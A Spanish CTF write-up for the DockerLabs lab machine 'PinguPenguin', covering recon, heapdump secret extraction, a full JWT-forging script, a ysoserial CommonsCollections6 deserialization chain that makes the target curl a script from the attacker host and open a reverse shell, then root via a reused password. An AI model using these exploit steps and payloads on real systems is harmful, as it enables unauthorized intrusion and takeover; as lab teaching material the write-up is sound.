# PinguPenguin

- **Datos:**

    • **Nombre de la Máquina:** PinguPenguin

    • **Sistema Operativo:** Linux (contenedor)

    • **Dificultad:** Difícil

    • **Plataforma:** DockerLabs

## - Despliegue:

```bash
sudo bash auto_deploy.sh pingupenguin.tar
```

**IP máquina víctima:** 172.17.0.2

## - Conectividad:

```bash
ping -c 5 172.17.0.2
```

## - Escaneo de puertos:

```bash
nmap -p- --open -sS -Pn -n --min-rate 5000 -vvv 172.17.0.2 -oG allPorts
```

Puerto 8080 abierto.

```bash
nmap -p8080 -sVC -Pn -n 172.17.0.2 -oN targeted
```

## - Enumeración:

Usamos gobuster en busca de directorios o archivos sobre el servidor web.

```bash
gobuster dir -u http://172.17.0.2:8080 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,doc,txt,html,js,zip,tar
```

Al acceder a `http://172.17.0.2:8080` encontramos un aplicativo web para apadrinar pingüinos mediante un aporte mensual.

Probamos `whatweb` para identificar tecnología, sin resultados concluyentes:

```bash
whatweb http://172.17.0.2:8080
```

Al solicitar una ruta inexistente aparece una **Whitelabel Error Page**, firma inconfundible de **Spring Boot**.

```
http://172.17.0.2:8080/test
```

Confirmamos la tecnología consultando el endpoint de Actuator, que debería devolver un JSON con `_links` si Spring Boot Actuator está habilitado:

```bash
curl -s http://172.17.0.2:8080/actuator
```

Con Actuator confirmado, revisamos si `/actuator/env` expone variables de entorno con credenciales. Sin embargo, los valores sensibles aparecen enmascarados con `"******"`:

```bash
curl -s http://172.17.0.2:8080/actuator/env
curl -s http://172.17.0.2:8080/actuator/env/app.jwt.secret
curl -s http://172.17.0.2:8080/actuator/env/spring.datasource.password
```

Spring Boot está configurado para ocultar valores sensibles en `/env`, pero **esto no aplica al heapdump**: un volcado de memoria contiene cualquier cadena que haya existido en texto plano durante la ejecución del proceso, máscara de `/env` incluida (la máscara es solo cosmética sobre ese endpoint, no afecta a lo que ya está en RAM).

```bash
curl -s -o heapdump.bin http://172.17.0.2:8080/actuator/heapdump
ls -la heapdump.bin
```

Buscamos dentro del volcado la clave de firma JWT:

```bash
strings heapdump.bin | grep -i "secret-key"
```

```
app.jwt.secret=changeme-super-secret-key-pinguinos-prod-2024
```

## - Explotación: falsificación de JWT (privilege escalation)

Con la clave de firma en mano, el plan es forjar un token válido con rol `admin`. Antes de eso nos registramos con una cuenta normal e iniciamos sesión, para ver cómo luce un token **legítimo** emitido por el servidor.

Con `Ctrl+Shift+C` → Almacenamiento → Cookies, copiamos el JWT de sesión legítimo y lo decodificamos en [jwt.io](https://www.jwt.io/) para confirmar su estructura (`header.payload.firma`).

Construimos un nuevo token con rol `ADMIN`, firmado en **Base64 URL-safe** (requisito del estándar JWT) con la clave extraída del heapdump:

```bash
HEADER=$(echo -n '{"alg":"HS256","typ":"JWT"}' | base64 -w 0 | tr '+/' '-_' | tr -d '=')

PAYLOAD=$(echo -n '{"sub":"admin","role":"ADMIN","iat":'"$(date +%s)"'}' | base64 -w 0 | tr '+/' '-_' | tr -d '=')

SECRET="changeme-super-secret-key-pinguinos-prod-2024"

FIRMA=$(echo -n "$HEADER.$PAYLOAD" | openssl dgst -sha256 -hmac "$SECRET" -binary | base64 -w 0 | tr '+/' '-_' | tr -d '=')

TOKEN="$HEADER.$PAYLOAD.$FIRMA"
echo "$TOKEN"
```

Sobrescribimos la cookie de sesión del navegador con este token y recargamos la página: ahora la sesión tiene rol `admin`.

Accedemos a `http://172.17.0.2:8080/admin` y encontramos la flag.

```
FLAG{actuator_h34pdump_jwt_f0rg3ry_pwn3d}
```

## - Explotación: deserialización insegura (RCE)

El panel admin tiene una funcionalidad de "restaurar configuración" que acepta una cadena en Base64. El placeholder del formulario revela que se trata de un **objeto Java serializado** (cabecera `rO0AB`):

```bash
echo "rO0ABXNyAC4uLg==" | base64 -d | xxd | head -5
```

La cabecera `aced 0005` (*magic number* de serialización Java) lo confirma. Un endpoint que deserializa directamente una entrada del usuario con `ObjectInputStream.readObject()` es vulnerable a **Java Deserialization Attack**. Al revisar las dependencias del aplicativo, se identificó la presencia de Apache Commons Collections 3.2.1.

Dado que versiones modernas del JDK bloquean gadgets clásicos como CommonsCollections1 o CommonsCollections3 mediante restricciones en AnnotationInvocationHandler, se optó por la cadena CommonsCollections6, la cual se apoya en TiedMapEntry y LazyMap sin verse afectada por dicha mitigación. Además, como Runtime.getRuntime().exec(String) en Java no invoca un intérprete de comandos por defecto (lo que impide usar directamente pipes o redirecciones complejas), se implementó una ejecución en dos etapas:

En la máquina atacante (172.17.0.1), creamos un script r6.sh que contiene el comando para entablar la reverse shell hacia nuestro listener en el puerto 4444, y levantamos un servidor HTTP local en el puerto 8000:

```bash
python3 -m http.server 8000
```

Dejamos un listener a la escucha con Netcat en otra terminal:

```bash
nc -lvnp 4444
```

Etapa 1: Con `ysoserial` generamos el payload para que el servidor descargue el script mediante curl en /tmp:

```bash
java -jar ysoserial-all.jar CommonsCollections6 "curl -s http://172.17.0.1:8000/r6.sh -o /tmp/r6.sh" | base64 -w 0
```

Enviamos esta cadena en el formulario de restauración de /admin. El servidor HTTP local registra la petición GET /r6.sh confirmando la descarga.

Etapa 2: Generamos un segundo payload para interpretar el script con sh:

```bash
java -jar ysoserial-all.jar CommonsCollections6 "sh /tmp/r6.sh" | base64 -w 0
```

Al enviarlo por el formulario, recibimos la conexión reversa en nuestro listener de Netcat como www-data.

**Estabilización de la TTY:**

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm-256color
export SHELL=bash
source /etc/skel/.bashrc
```

## - Escalada de privilegios

Enumeramos el directorio de la aplicación:

```bash
ls -la /app
cat /app/.env
```

Encontramos una variable `RECOVERY_KEY` documentada como clave de recuperación de un flujo de negocio, con un comentario que indica que se reutiliza como contraseña de la cuenta `root` del sistema operativo.

```
RECOVERY_KEY=recoverypasswordpenguin
```

Validamos la hipótesis cambiando de usuario con esa clave:

```bash
su root
```

### ¡Ya somos root!

---

## Vulnerabilidades identificadas

| # | Vulnerabilidad | CWE |
|---|---|---|
| 1 | Exposición de Spring Boot Actuator / heapdump sin control de acceso adecuado | CWE-200 |
| 2 | Secreto de firma JWT hardcodeado y recuperable → forjado de token admin | CWE-321 / CWE-347 |
| 3 | Deserialización insegura de objetos Java en endpoint administrativo → RCE | CWE-502 |
| 4 | Reutilización de credenciales entre la aplicación y la cuenta root del SO | CWE-798 |
